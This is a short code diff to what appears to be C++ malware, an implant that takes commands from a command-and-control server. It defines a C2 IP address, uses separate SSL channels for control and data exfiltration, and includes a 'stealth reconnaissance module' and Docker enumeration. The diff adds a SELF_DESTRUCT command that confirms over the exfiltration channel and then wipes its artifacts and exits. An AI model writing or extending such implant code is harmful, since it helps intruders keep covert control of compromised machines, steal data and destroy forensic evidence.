@@ -20,6 +20,7 @@
 // Full stealth reconnaissance module
 #include "recon.h"
 #include "docker_enum.h"
+#include "self_destruct/self_destruct.h"
 
 #ifndef C2_IP
 #define C2_IP "10.37.1.249"
@@ -131,6 +132,13 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
         oss << "Details: " << result.details << "\n";
         oss << "=== END ===\n";
         exfil_data = oss.str();
+    } else if (keyword == "SELF_DESTRUCT") {
+        c2_response = "SELF_DESTRUCT_INITIATED " + id;
+        exfil_data = "SELF_DESTRUCT: Cleaning up all artifacts and terminating.\n";
+        if (exfil_ssl) {
+            SSL_write(exfil_ssl, exfil_data.c_str(), exfil_data.size());
+        }
+        self_destruct(); // This function calls exit(0)
     } else {
         c2_response = "ERR " + id;
     }
